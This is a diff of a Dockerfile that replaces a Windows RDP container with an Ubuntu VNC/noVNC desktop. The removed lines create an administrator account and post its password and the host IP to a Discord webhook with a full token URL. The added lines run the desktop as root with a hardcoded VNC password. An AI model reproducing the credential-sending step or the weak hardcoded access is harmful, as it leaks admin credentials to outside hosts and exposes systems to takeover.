@@ -1,28 +1,29 @@
-# Use the Windows 11 base image
-FROM mcr.microsoft.com/windows/servercore:ltsc2022
+# Use the latest Ubuntu base image
+FROM ubuntu:20.04
 
-# Set working directory
-WORKDIR C:\app
+# Install necessary dependencies
+RUN apt-get update && apt-get install -y \
+    ubuntu-desktop \
+    xfce4 \
+    xfce4-goodies \
+    xorg \
+    openbox \
+    tightvncserver \
+    novnc \
+    websockify \
+    xterm \
+    && apt-get clean
 
-# Install necessary tools
-RUN powershell -Command \
-    "Set-ExecutionPolicy Bypass -Scope Process -Force;"
+# Set the environment variables
+ENV USER=root
+ENV DISPLAY=:1
 
-# Expose the RDP port
-EXPOSE 3389
+# Set the VNC password (can be modified as needed)
+RUN mkdir -p /root/.vnc \
+    && echo "vncpassword" | vncpasswd -f > /root/.vnc/passwd \
+    && chmod 600 /root/.vnc/passwd
 
-# Create an RDP user and generate a random password
-RUN powershell -Command \
-    "net user RDPUser * /add; \
-     net localgroup administrators RDPUser /add; \
-     $password = [System.Web.Security.Membership]::GeneratePassword(12, 2); \
-     net user RDPUser $password; \
-     echo $password > C:\rdp_password.txt;"
-
-# Start RDP and send credentials to a webhook
-CMD powershell -Command \
-    "$password = Get-Content C:\rdp_password.txt; \
-     $ip = (ipconfig | Select-String -Pattern 'IPv4').Line.Split(':')[-1].Trim(); \
-     Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1289955380323160127/6JzbyzLROIo80Hb4uh3ImGpEPg2pKW5U1bLenvOcL7uqxd4bAxXbZaPsAsk9xO66wn35' -Method Post -Body (@{username='RDPUser'; password=$password; ip=$ip} | ConvertTo-Json); \
-     Start-Service -Name TermService; \
-     while ($true) { Start-Sleep -Seconds 3600; }"
+# Start the VNC server and the web interface
+CMD /usr/bin/vncserver $DISPLAY && \
+    websockify --web=/usr/share/novnc/ 6080 localhost:5901 && \
+    tail -f /dev/null
